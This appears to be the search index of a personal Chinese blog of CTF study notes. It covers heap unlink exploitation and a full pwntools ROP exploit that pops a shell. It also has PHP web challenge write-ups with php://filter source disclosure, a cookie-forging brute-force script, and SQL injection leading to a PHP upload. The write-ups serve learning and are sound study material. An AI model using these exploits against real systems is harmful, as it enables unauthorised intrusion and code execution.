{"pages":[{"title":"about","text":"死肥宅 真恶心","path":"about/index.html","date":"09-09","excerpt":""},{"title":"随笔（乱几把写）","text":"2018-09-20 01:40:10 建这个是为了写点什么，但是建完之后又不知道写什么了。。。。写感想又怕太矫情，算了留着之后看看想写什么吧。","path":"essays/index.html","date":"09-20","excerpt":""},{"title":"plan","text":"","path":"plan/index-1.html","date":"09-20","excerpt":""},{"title":"不知道什么时候能提上日程的近期计划 👇","text":"2019-09-20 把 PWN 入门早点结束吧（求你了） 每周学习一个 Web 安全 读完码农翻身 读完程序员的自我修养","path":"plan/index.html","date":"09-20","excerpt":""},{"title":"plan","text":"","path":"plan/index-2.html","date":"09-20","excerpt":""},{"title":"藏着一些小秘密。。","text":"看看大哥收藏的 Web 安全Web-Security-Learning PWN 爷爷PWNABLEropemporium &gt;&gt; 一系列 ROP 题目Linux 系统函数大全一步一步学ROP之linux_x86篇 好好打 CTF 吧ctf-all-in-onectf-wiki &lt;&lt; 和上面这个一起食用 平台 CTF TIMES &lt;&lt; 很不错的平台Jarvis OJ实验吧bug kui 春秋php-security-calendar-2017","path":"collections/index.html","date":"09-11","excerpt":""},{"title":"surprised","text":"heheh :)","path":"surprised/index.html","date":"09-09","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"09-09","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"09-09","excerpt":""}],"posts":[{"title":"堆溢出1 -- unlink","text":"123[原文][1]照着这篇文章写的，不算翻译吧（毕竟我英文差的**） 这篇文章将学习怎么使用 unlink 来进行堆溢出，先看看漏洞程序：123456789101112131415161718/* Heap overflow vulnerable program. */#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main( int argc, char * argv[] )&#123; char * first, * second;/*[1]*/ first = malloc( 666 );/*[2]*/ second = malloc( 12 ); if(argc!=1)/*[3]*/ strcpy( first, argv[1] );/*[4]*/ free( first );/*[5]*/ free( second );/*[6]*/ return( 0 );&#125; [3] 中 没有将 argv1 复制进堆块 first 中且没有任何限制，因此当用户输入一个大于 666 字节就会覆盖下一个 chunk。这将造成任意代码执行。 这个技术的主要思想是 将 GOT 入口覆盖成 shellcode 地址，当 [5] 执行时，shellcode 就会被执行了。 首先分析下 glibc malloc 在 free 的时候都做了什么吧。 默认情况下（不影响 second 块的情况下），在 [4] 中做了如下操作： 1. 非 mmap 的 chunk，合并 前/后 的块 2. 合并上一个块： * 如果当前释放的 chunk 中的 P 位为 0，在 bins 中 unlink 上一个块，将当前块的大小增加上上一个块的大小 并且 将当前块指向上一个块。 * 在这个例子中 P 位为 1，第一个块默认的 P 位都为 1，尽管上一个块不存在。 3. 合并下一个块： * 当下一个块为 free 时，将下一个 chunk 从 binlist 中移除并且将当前块的大小加上下一个块的大小。（在这里例子中下一个块为 second，所以也不会合并） * 有意思的是，获取下一个块是否为 free 是根据下下个块的 P 位来决定的。 4. 然后添加 合并后的块 到 unsorted bin 中。在这里例子中没有发生合并，所以只用将 first 添加到 unsorted bin 就好。 下面说说攻击者在第三行中覆盖 second 这块内存的内容： prev_size = 覆盖成偶数（使 PREV_INUSE 位为 0） size = -4 fd = free address -12 bk = shellcode address 在攻击者的用向下，[4] 做了如下事： 合并上下堆块 合并上一个块：和上面分析的一样，不再重复 合并下一个块： 判断下一个块是否为空闲，前面提到过是根据下下个块的 P 位来判断的。那么怎么找到下下个块的地址呢？就是：下一个块的地址+下一个块大小。在这里我们把下一块的大小变成了-4，所以他 下一块的地址（prev_size）+（-4） 又指向了自己（我指我自己） 戛然而止，回顾一下 unlink 的过程： 1. 首先传入要 unlink 的堆块，假定变量 P 2. BK = P-&gt;bk,FD = P-&gt;fd // 将 P 的 bk 和 fd 分别给 BK 和 FD 变量 3. FD-&gt;bk = BK, BK-&gt;fd = FD（因为用文字太绕了。） 4. //用文字描述就是：当前块的上一个块的下一个块（即：(P-&gt;bk)BK-&gt;fd） 等于 当前块的下一块。下一块的上一块同理。 来张图比什么都清晰： —此图来自 ctf-wiki 回到上面（我指我自己处）：此时的堆应该是这样的： next chunk| 字段 | 值 ||—|——||prev_size|偶数（最后一位为 P 位，只要是偶数最后一位就为 0，因此偶数即可）||size| -4 （减去4，指向了自己） ||fd| GOT入口-12 ||bk| shellcode 地址 | 回顾一下前面的代码：free(first) 执行这句话的时候发生了什么？ 释放掉 first 块 判断上一个块是否空闲，在这里不是空闲的，所以跳过 判断下一个块是否空闲，在这里判断的是 second 块，原本应该是 非空闲 的，but 这里的 size 是 -4，所以取下下块的时候又跑到了自己块的 prev_size 处，这里的值是偶数，所以 P 位为0，所以就未占用咯，所以要合并咯，合并就要用到 unlink 咯。 那么在这里 unlink 都做了什么呢？ 1234(GOT入口-12)FD = P-&gt;fd(shellcode地址)BK = P-&gt;bk（GOT入口表【因为 bk 相距 prev_size 12 字节】）FD-&gt;bk = BK （这里是什么不重要了，但是此处的内容也会被破坏，所以要注意）BK-&gt;fd = FD 在这里 GOT 入口表被覆盖成 shellcode 了。 至此，unlink 的利用就算结束了，下篇文章分析一道，1234#!/usr/bin/python#coding:utf-8while True: print &quot;特别特别特别&quot; 简单的题目。","path":"2018/10/27/heap_unlink/","date":"10-27","excerpt":""},{"title":"堆笔记1","text":"1. 什么是 chunk由 malloc 申请的内存称为 chunk 2. chunk 结构123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize chunk 字段解释 prev_size ： 如果前一个chunk空闲，则该字段表示前一个chunk的大小。如果前一个chunk 非空闲状态，则此处作为前一个 chunk 的数据部分（即被前一个chunk使用）。 size ： 记录当前块的大小，必须为 2 * SIZE_T 的整数倍（SIZE_T 在32位为4，64位为8）该字段的低三位和大小没关系，分别为： 1. NON_MAIN_ARENA 记录该 chunk 是否属于主线程 2. IS_MAPPED 记录当前 chunk 是否由 mmap 分配 3. PREV_INUSE 记录前一个 chunk 是否被分配（第一个被分配的 chunk 的 P位都会设置成 1，防止访问前面的非法内存）。当该位为 0 时，可以用 prev_size 字段获得上个 chunk 的大小和地址。也方便空闲块的合并 fd： 如果该 chunk 被分配，从此处开始就是用户的数据，否则指向上一个空闲 chunkbk： 指向上一个空闲的 chunk fd_nextsize： 指向前一个与当前 chunk 大小不同的空闲块bk_nextsize： 指向后一个与当前 chunk 大小不同的空闲块 3. bins 什么是 bins 用户释放掉的 chunk 不会立马归还给系统，而是程序保留管理着，这样下次再分配时无需系统调用，节省资源。 ptmalloc 将 chunk 分为四类：1234fast binsunsorted binssmall binslarge bins 对于后三个 bins，ptmalloc 将他们分在同一个数组中，结构如下：123#define NBINS 128/* Normal bins packed as described above */mchunkptr bins[ NBINS * 2 - 2 ]; 数组中的 bins 顺序如下：1231. 数组第一个为 unsorted bin ，没有排序，内部 chunk 比较杂2. 数组中第 2 到 63 个为 small bin ， 同一个 small bin 链中的大小相同，两个相邻的 small bin 链中的大小相差字节数为 2*机器字长（即 32 位相差8 ，64位相差 16）3. 后面的为 large bins，chunk 的 fd 按从大到小排序。 当然还有上面提到的 fast bins，ptmalloc 为了提高分配速度，会把一些小的 bins 分配到 fast bins 中，fast bins 中的每个 P 位（chunk 的使用标记）都被设置为 1，所以不会被合并起来。 4. bins 们4.1 fast bin为了提高分配效率而设计的 fast bin 将存储一些较小的内存块，它们的 使用位永远被置为 1，所以不会被合并起来。 看两个宏：12345678910#ifndef DEFAULT_MXFAST#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)#endif#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)#define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))#define get_max_fast() global_max_fast ptmalloc 首先会调用 set_max_fast 并把 DEFAULT_MXFAST 传进去，也就是设置 fast bins 中 chunk 的最大值。 MAX_FAST_SIZE 为 0 时，系统就不会支持 fastbin 。 当申请空间一个小于或等于 global_max_fast 时，ptmalloc 首先会在 fast bin 查询是否有合适大小的块。 再来看个东西：12#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) 当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后大于 FASTBIN_CONSOLIDATION_THRESHOLD，表明内存碎片比较多了，我们就需要把 fast bins 中的 chunk 都进行合并。 malloc_consolidate 函数可以释放后所有 fastbins 并且将他们和其他的 空闲块 合并。 4.2 small binsmall bins 有 62 个双向链表，每个链表存储的大小都一致。 small bins 中每个链表的大小都有规律，即：chunk_size = 2SIZE_INDEXindex，例如在 32 位系统下下标为 2 的链表的大小为 242 = 16 个字节。 当然，fast bin 中的 chunk 是有可能会被放到 small bin 中去的，因为他们确实有些重合了。 4.3 large bin large bins 共有 63个 bin，每个 bin 中的大小不一致，但有个差值。 每个 bin 中的 chunk 大小之间公差一致。 第一个 large bin 的起始 chunk 大小为 512 字节，该组公差为 64B，所以该组可以存储 chunk 的大小范围为： [512,512+64) 4.4 unsorted bin 乱序的 bins 放进 unsorted bin 的 chunk 来自： 分割完大块后剩余部分，并且该部分要大于 MINSIZE 释放不属于 fast bin 的 chunk 并且 该 chunk 不和 top chunk 紧邻。 4.5 top chunk 简单理解就是在地址最高的一个 chunk，不属于任何 bins。 当程序需要分配的内存大小在 bins 中都不满足的情况下，尝试用 top chunk 给程序分配，如果够，则剩余部分继续做 top chunk，如果不够，则申请扩展内存后再分配。 当邻近 top chunk 的 chunk 被释放后，会合并到 top chunk 中 4.6 last remainder 当在 small chunk 找不到合适的块时，如果 last remainder chunk 大于要分配的内存，则分割这个 chunk 给用户并将剩余部分继续作为 last remainder chunk，该块好像是放在 unsorted bins 中的。","path":"2018/10/22/堆笔记1/","date":"10-22","excerpt":""},{"title":"程序员的自我修养-第一页","text":"1.2 万变不离其宗 讲了南桥北桥PCI 看不懂看不懂。 SMP 与多核 什么是 SMP：对称多处理器（Symmetrical Multi-Processing），就是多个 CPU 咯。什么是 多核：两个 CPU 你也买不起，所以良心的资本家们将 CPU 中的 缓存部件共享（据说是比较贵），把核心保留起来。即:多个核心+一个缓存部件 除非你想把 CPU 的每一滴油水都榨干，否则可以把多多核和 SMP 看成同一个概念 为什么不升级 CPU 本身而添加多核来提速呢？ 因为人们在制造 CPU 的工艺方面已经达到了物理极限，除非制造工艺有本质的突破。否则 4GHZ 就是 CPU 的天花板了。 1.3 站得高，望得远Any problem in computer science can be solved by another layer of indrection. 这节应该是强调了接口的概念： 接口？ 什么是接口？ 下层实现，上层使用。 比如类库中封装了 printf 函数。写代码的时候无需考虑 printf 用汇编的实现方式。所以 Windows 的 C 代码到了 Linux 依然可以编译，即使底层实现 printf 的方法不同（应该不同吧？） 什么是 硬件规格：驱动程序操作硬件的 接口，定义了如何与硬件通信 1.4 操作系统做什么1.41 别让 CPU 打盹 多道程序的出现 什么是多道程序呢： 聪明的程序员为了让 CPU 忙碌起来，写了个监控程序，当当前程序暂时无需使用 CPU 时（读写硬盘），监控程序就把 CPU 让给正在等待的程序。这就是多到程序。 多道程序的缺点： 没有优先级，所以有些很急的任务要等很久。想象一下如果点击一下鼠标，十分钟之后才等到 CPU 处理。。 进化成分时系统吧 什么是分时系统： 每个程序在运行一段时间后，程序 主动 让出 CPU 给其他程序。Windows早期版本（如 Windows 3.1 就是这种模式）。程序调用系统接口 Yield 、GetMessage、PeekMessage 时，Window3.1 会判断是否有其他程序正在等待 CPU ，如果有，就暂停当前程序，把 CPU 让给其他程序。 分时系统缺点： 但是，注意这是程序 主动 让出 CPU 啊。程序要是 while(1) 那你可咋办哟~ 多任务系统才是王道啊 什么是多任务系统： 操作系统接管了所有硬件资源并且本身运行在一个受硬件保护的级别。所有应用程序都以 进程 的方式运行在比操作系统权限更低的级别（作弊了呀）。 抢占式是什么： CPU 由操作系统分配。每个进程根据优先级都有机会得到 CPU。但如果运行超过一定时间，系统会暂停该进程，将 CPU 资源分配给其他正在等待的程序。 （这个模式是操作系统强制剥夺 CPU 资源啊~） 多任务的缺点： 书中没说他有缺点，那就当他没有缺点吧。 1.42 设备驱动 这一小节看的我想死，所以没有笔记 1.5 内存不够怎么办？早期程序是直接运行在物理内存的。 假设当前计算机物理空间有 128M ，程序A 需要 10M， 程序B 需要 100M，程序C 需要 20M，如果需要同时运行 A 和 B，那么可以很直接的将物理内存中 0-10M 分配给 A，10-110 分配给 B。 很明显会造成很多问题： 地址空间不隔离所有程序都直接访问物理内存，程序A 可以直接访问 程序B 的数据甚至代码。 使用效率低由于没有管理机制，所以如果现在要运行 C 的话。需要将其他程序暂时移到磁盘里去。但是程序需要连续的空间，所以移动 A 肯定是不够的，所以只能移 B。可以看到整个过程有大量的数据在换入换出，导致效率十分低下 运行的地址不确定每次分配的空间地址都不确定，但是数据和跳转时的目标地址都是固定的。这就涉及到重定向的问题了，会在以后讨论 1.51 关于隔离第一个问题就是隔离，怎么解决呢？ 聪明的程序员们建立了一个概念：虚拟地址空间。 虚拟地址空间：假的，不存在的。每个进程只能访问自己的地址空间，有效的做到了隔离物理地址空间：和名字一样，物理存在的。如果地址线有 32 条，那么物理空间就有 2^32 字节（4G）。但是如果你只装了 512 MB 的内存，那物理地址的有效部分为： 0x00000000 ~ 0x1FFFFFFF 1.52 分段分段的基本概念：说回上面的 程序 A 和 程序 B。假设有一个 地址从 0x0000000 到 0x00A00000 的 10M 虚拟空间。然后在物理地址中挑选一块相同大小的空间：0x00110000 到 0x00B10000，将这两块地址空间一一映射。（由软件映射，别问什么软件） 这里解决了上面提到的 第一个 和 第三个问题：两块没有重叠的空间，当 A 访问超出 0x00A0000 的时候，硬件就会判断这是个非法访问。 局部性原理 但是第二个问题还是没变啊，依然是每个整个程序的搬入搬出。聪明的程序员总是有解决办法，他们发现：当一个程序运行时，在某个时间段内，只是频繁的使用一小部分数据，也就是说很多数据一段时间内不会被访问到，这就是 tmd 局部性原理。 怎么利用起来了呢？程序员们给方法起了个名：分页。 1.53 分页分页的就是把地址空间人为的分成固定大小的页，页的大小由硬件决定，或者硬件支持多种大小的页，由操作系统选择。 加载一个程序时先将程序虚拟地址分页，然后将常用的页映射到物理内存，不常用的存在磁盘中（不同程序的有些虚拟页被映射到同一个物理页，实现内存共享）。 那要访问磁盘中的页时怎么办呢？此时硬件捕获到一个信息：页错误，然后阻塞该程序，将磁盘中的页换入内存中。 当然也要保护页啦，就好像上面提到的 两个程序用到同一个页时，这个页最好是不能被修改的，不然其中一个修改，另一个可能就读不到想要的数据/代码。每个页都可以设置权限属性，修改这些属性的权限也只有操作系统有。详细的介绍会放在日后。。。（不是我想放在日后） 虚拟内存的实现需要依靠硬件支持，对不同 CPU 来说是不同的，但是几乎所有的硬件都采用一个叫 MMU 的部件进行页映射，CPU 发出 虚拟地址 经过 MMU 转换成实际地址。 MMU 一般都集成在 CPU 内部。 1.6 众人拾材火焰高1.61 线程基础一个标准的线程有：线程ID，当前指令指针，寄存器集合和堆栈。","path":"2018/09/24/程序员的自我修养-第一页/","date":"09-24","excerpt":""},{"title":"一道简单的 PWN 题","text":"这道貌似是 ISG 2015 年的题了。。 本题WP 问题： 跟着栈溢出，将 EIP 覆盖成 write 函数的 plt 值，紧接着 read 的 plt 值，这里让我不解的是： 为什么 read 的函数被执行了。猜测应该是 write 函数中自带了 ret 指令。明天争取学会用 gdb 调试进 write 函数中吧。 接上。。尝试用 gdb 进入 write 函数。但是： 问了表哥后，表哥来了个姿势：先运行，在输入的时候按 CTRL+C （之前确实没学过 gdb ） 但是这里，可以整个更直接的：b write 运行&gt; 进入到 write 函数内，首先看看怎么取参数： 等会再讲。。 再看看最后，发现确实用的 ret（废话，不用 ret 怎么返回） 切入这道题。。。 思考 首先丢进 ida 里看看 很明显的一个缓冲区溢出。。（我也只会缓冲区溢出了） 这里写的 变量 v1 离 ebp 为 0xC(12) 个位置，但是实际测试为 0x10(16) 个位置。 这里玩个好玩的。。我们可以用 gdb_pattern 生成一些字符串，发送出去后查看 EIP。将此时的 EIP 记录下来再用 gdb_offset 查看偏移位置，这就是变量离 EIP 的位置了： 现在我们知道是离 20 个位置。我们可以先溢出玩玩，这里 checksec 发现开启了 NX 。我们可以先用 write 函数试试水。比如就打印 ida 代码中 第 6 行的 write(1, &quot;Welcome to ISG 2015!\\nPwn me to get the flag:\\n&quot;, 0x2Du); 在 ida 中看看 plt 的 write 地址： 再在 qira 中看看 welcome to isg.. 这段字符串在哪： 因为之前调用的 write 函数就是输出这段字符串，所以这个地址就是那段字符串的地址咯。。 整理一下： 初始栈的结构： 相对地址 对应值 0x0 变量 v1 0x4 … 0x8 … 0x12 … 0x16 ESP 0x20 EIP 所以这里填充 20 位任意字符。再用 write 函数的 plt 地址覆盖 EIP。 POC 如下： 看看 qira 中： 看到 write 函数执行了，但是我们没给参数，所以他取到了栈里的默认值，而中间的参数是最明显的，所以我们看看中间的参数位置是多少，方便覆盖。位置是：0xf6fff018 ，此时栈顶的地址： 0xf6fff008 。 回到一开始。。在 write 函数的截图中，发现取得参数位置分别是：esp+0x8, esp+0xC,esp+0x10。在取参数之前还有个 push 操作（在 write 函数中，上面的截图有。。），所以取参数得实际位置 +4。所以分别为： esp+0x8，esp+0x10,esp+14 。 再看个明显点的例子： 这里尝试控制参数。。 简单的加法：0x8+0x14 = 0x1C 函数调用 ok，别忘了一开始要做的事情，就是再调用一次 write 函数，输出一次 Welcome... 那个字符串。 找基地址 我们可以直接去 GOT 表找 write 函数的地址： 在 GOT 表中找到了 write 函数：0x804a01c。 改一下 ROP 链，将 write 的实际函数地址打印出来： 可以看到输出了正确的地址。代码中上面的 r.recv 是用来接收一开始输出的那段 welcome...，但是没必要输出（ 不接收的话下面 recv 还是会先接收到这个字符串 ）。 获取 system 地址和 /bin/sh 字符串 通过 ldd 看看这个 二进制 文件用了什么链接库.. 1234root@nick-machine:/home/nick/liey# ldd pwnme linux-gate.so.1 =&gt; (0xf77bc000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f4000) /lib/ld-linux.so.2 (0x565e8000) /lib32/libc.so.6 中有我们想要的，首先是 获取 write 函数的偏移地址，这样就能获取到基地址了，可以用 readelf： 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep write@ ..... 2303: 000d9900 119 FUNC WEAK DEFAULT 12 write@@GLIBC_2.0 记下来，偏移地址 0xd9900。 接下是 system 函数偏移地址： 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep system@ ... 1443: 0003fe70 56 FUNC WEAK DEFAULT 12 system@@GLIBC_2.0 system 偏移地址是 0x3fe70。。接下来是 /bin/sh ，这个字符串用来传进 system 函数以便获取 shell，这里我们用 ROPgadget 1234root@nick-machine:/home/nick/liey# ROPgadget --binary /lib32/libc.so.6 --string &quot;/bin/sh&quot;Strings information============================================================0x0015da8c : /bin/sh 再发送 接下来思考一个问题，就是纵使在发送完一次 shellcode 只会知道了 基地址。但是我们却不能再调用了。。。 在最前面提到过。write 函数会调用 ret。可以把这个理解成 pop eip。也就是在栈顶中取出 eip。。。那么栈顶是哪呢？ 就是在 write 后以及所有参数的最前面。前面我用 0x61616161 替代了。。 但是又会遇到一个问题。。就是即使直接调用了 system 函数，函数内取参数是取的 esp+0x8，但是 esp+0x8 这个位置被 write 函数的 0xC 占用了。。 想一下是那个函数写进这段 shellcode 的。对，main 函数，我们可以调用会 main 函数，再调用一次 shellcode，只不过这次是调用 system 函数，而不是 write 函数。 (main 函数的位置再 ida 中可以找到) 完整的POC： 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *r = remote(&quot;192.168.1.107&quot;,4000)write_plt=0x08048370main=0x804847dprint(r.recv())poc_rop1=[ write_plt, main, 0x1, 0x804a01c, 4,]shellcode=&quot;a&quot;*20 + flat(poc_rop1)r.sendline(shellcode)write_offset = 0xd9900system_offset =0x3fe70bin_bash = 0x0015da8cbase = p32(int(r.recv().encode(&apos;hex&apos;),16)).encode(&apos;hex&apos;)base=int(base,16)-write_offsetsystem = base + system_offsetbin_str = base + bin_bashpoc_rop2 = [ system, 0x61626364, bin_str,]shellcode2 = &quot;a&quot;*12 + flat(poc_rop2)r.sendline(shellcode2)r.interactive() 需要注意的是第二次只需要填充 12 个 字符即可。。 效果： Done….","path":"2018/09/11/一道简单的 PWN 题/","date":"09-11","excerpt":""},{"title":"蓝鲸笔记管理系统（塔主nb）","text":"蓝鲸官网本题源码 首先先随便注册个，登陆看看： 这里看到个提示一样的东西：访问 /dbinit.sql 拿到 数据库结构。 再看看地址，首页的 url 地址为：http://106.39.10.134:10002/index.php?action=front&amp;mode=index 一开始还以为是 MVC 架构的，后来看了师傅的 WP 发现： 123456&lt;?php$action=$_GET['action'];$mode=$_GET['mode'];$file=$action.'/'.$mode.'.php';include($file);?&gt; 很明显的一个文件包含漏洞。用 php://filter 伪协议读取源码： /index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index 但是这里读不出 config.inc.php 原因可以在 index.php 中看到： 1else if(!preg_match(&apos;/\\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;]) mode 中不能包含 . 共读取到：123456789index.phpcommon.phpadmin/index.phpadmin/login.phpadmin/setpagenum.phpfront/index.phpfront/login.phpfront/newnote.phpfront/register.php 我们可以看看 admin/index.php 中是怎么验证是否登陆的（别问为什么一上来就看这个）： 调用了 check_login 和 get_level 函数，这两个函数在 common.php 中。我们先看看这个文件的开头： 很明显，这里进行了一些初始化操作。 再来看看两个验证函数： 这里将 cookie 中的 uid 取出，以 | 分割，加密判断。 如果成功返回当前 $_SESSION 中的值，否则返回 False。如果没登陆，那此时的值为 NULL ，但是判断使用的是 严格 判断，即： 1if(check_login()!==false&amp;&amp;get_level()!==false) 这两个函数的绕过方法是一样的，所以下一步我们的目标就是研究： $userinfo[1]==encode($userinfo[0]) 这个条件怎么成立，这个数组是我们可控的，我们可以跟进 encode 函数中： 123function encode($str)&#123; return md5($_SESSION['SECURITY_KEY'].$str);&#125; 不难理解，翻上面发现： 1$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6); 来看看这个函数的实现：1234567891011function rand_str($lenth=16)&#123; $rand=[]; $_str=\"wh\"; while($lenth)&#123; $rand[]=$_str[rand(0,strlen($_str)-1)]; $lenth--; &#125;// var_dump($rand); return implode($rand);&#125; 随机取6位 w 或 h 整理一下思路： 要想绕过登陆验证，就要让验证函数返回 NULL。 函数返回 NULL 的条件为： 1if($userinfo[1]==encode($userinfo[0])) $userinfo 是我们可以控制的，唯一不确定的是 encode 函数中用到的 $_SESSION[&#39;SECURITY_KEY&#39;] 因为不对，所以我们写个脚本爆破： 1234567891011121314151617181920import requestsimport itertoolsfrom hashlib import md5lst = itertools.product(&quot;wh&quot;, repeat=6)url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;def m(s): return md5(s).hexdigest()for i in lst: key = m(&apos;&apos;.join(i) + &apos;admin&apos;) headers = &#123; &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key &#125; r = requests.get(url, headers=headers) if r.text.find(&quot;not login&quot;) &lt; 0: print(headers) 很快就会输出 Cookie，添加上浏览器，再访问 后台的 index 即可。。 踩坑 这里还有个坑，就是如果你当前的 SESSION 已经登陆过前台，那么爆破就会失败。原因可能是 $_SESSION 中登陆的用户的 level 为 0，在 get_level 函数中会返回 False 现在我们已经登陆了后台，看看后台的代码： 这里拼接了个 get_page_size()，这个函数在 common.php 里，我们看看这个函数： 123456function get_page_size()&#123; $sql=&quot;select num from page&quot;; $res=mysql_my_query($sql); $row=$res-&gt;fetch_assoc(); return $row[&apos;num&apos;];&#125; 只做了很简单的查询。 我们会发现后台页面还有个设置页面（setpagenum.php），进去看看： 这个设置就是 get_page_size 查询并返回的表和字段，猜测关键点可能就在这了（别问为什么猜）。 可以看到，这里做了 is_numeric 的判断，判断是否是数字。 mysql 中允许这么玩：select 0x313233; 这条语句会输出 123，也就是 ASCII 码。 但是不允许这么玩： select &#39;0x313233&#39;; 注意这里加了单引号，此时输出 0x313133 我们发现这里是没有加引号的，所以我们传进来的值会在执行时解析成 ASCII 码。如果这是故意留的洞，那该字段的属性就不会是 int。因为 int 就不能存储字符串了。 回顾一下查询语句： 12$page_size=get_page_size();$sql=&quot;select * from note limit 0,&quot;.$page_size; 思考能不能用这样的语句：select * from note limit 0,1 union select 2 （！！！ 5.7 以后 limit 必须要放在最后，5.7以前是可以的） 5.7 以后会报：ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT 利用 那么现在就可以利用了： 在 mysql 里运行： 这样我们就可以很方便的获得 16进制 了（只要转成 ASCII 就可以了）。 加上 0x 填上去提交： 到前台： 可以看到 3 和 2 被显示出来了。。看回一开始拿到的数据库结构，发现有个flags 表和 flag 字段，构造一下就可以出来了。。 突然的结束，是因为懒","path":"2018/09/09/蓝鲸笔记管理系统/","date":"09-09","excerpt":""},{"title":"蓝鲸文件管理系统（塔主nb）","text":"蓝鲸官网本题源码 题目描述： 1蓝鲸为了整理自己的工具，开发了一个文件管理系统，本来对系统的功能很满意，可是为什么总有人把蓝鲸的文件名修改了？蓝鲸找到了机智的你帮助它审计代码~ 这题一开始直接给了源码。 首先先看看上传的代码（uplaod.php）： 这里两个关键点： 121. 限制了文件的后缀名2. 插入进数据库 首先想想能不能这样： 这样是不行得。。因为在下面的拼接文件名的时候用的也是这个后缀：1$name = $path_parts[\"filename\"] . $path_parts[\"extension\"]; //此为上传的文件名 根据题目描述，我们看看 rename.php： 这里的 $req 在 common.inc.php 中是这么定义的： 12345foreach(array($_GET, $_POST, $_COOKIE) as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125;&#125; 类似自动解析了吧。 采坑 假设我们上传的文件名为：test.jpg 这无论如何都会在新文件名后加上 $result[&#39;extension&#39;] 在这里起初想绕过 rename ，即类似 move_uploaded_file 函数一样，传入 windows 文件名中不允许的字符，类似：newname.php.php;.jpg 或者 newname.php.php/.jpg(两个 .php 是因为在第22行会对$newname进行一次 basename操作) 但是貌似 rename 函数会报错（总之就是不行，原谅我看不懂内核代码） 放弃这个想法，看了师傅的 WP 后发现： 关键点在 23行的 update 语句： 1update `file` set `filename`=&apos;&#123;$req[&apos;newname&apos;]&#125;&apos;, `oldname`=&apos;&#123;$result[&apos;filename&apos;]&#125;&apos; where `fid`=&#123;$result[&apos;fid&apos;]&#125; $result 是在 第13行 根据传入的文件名查询出来的。 这里把 oldname 字段设置成了 $result[&#39;filename&#39;]。 这里的 $result[‘filename’] 我们是可控的，且没有做任何过滤。虽然传入的时候经过了 addslashes 的过滤（在 common.inc.php 中），但是查询出来后却没有过滤。 可控有什么用呢？前面分析过这里最大的问题在改的新名字会被强制加上 $result[&#39;extension&#39;]。但是这里是可以注入的，所以只要我们的文件名够骚，我们就能操作 update 语句，我们就可以将 extension 字段覆盖为空。 比如：&#39;,extension=&#39;&#39;,filename=&#39;test.jpg（最后要为 .jpg ） 此时数据库和文件夹里的情况： 此时去改名，传入文件名：&#39;,extension=&#39;&#39;,filename=&#39;test(去掉后缀)新文件名传入：test 此时的sql语句：1sql：update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test&apos; where `fid`=2 再看看： ok，成功踩坑。此时发现数据中的 filename 和 文件夹中的不同。下次 rename 的时候会找不到 test 文件（此时数据库中的 extension 已经为空） last我们把上传的文件名改改：&#39;,extension=&#39;&#39;,filename=&#39;test.jpg.jpg 此时的语句：1update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test.jpg&apos; where `fid`=3 会发现把 filename 设置成了 test.jpg 了，此时数据库与文件夹一致（不想截图了。。） 再改次名：12oldname：test.jpgnewname：test.php 即可。","path":"2018/09/09/蓝鲸文件管理系统/","date":"09-09","excerpt":""},{"title":"Nothing。。。","text":":)","path":"2018/09/09/hello-world/","date":"09-09","excerpt":""}]}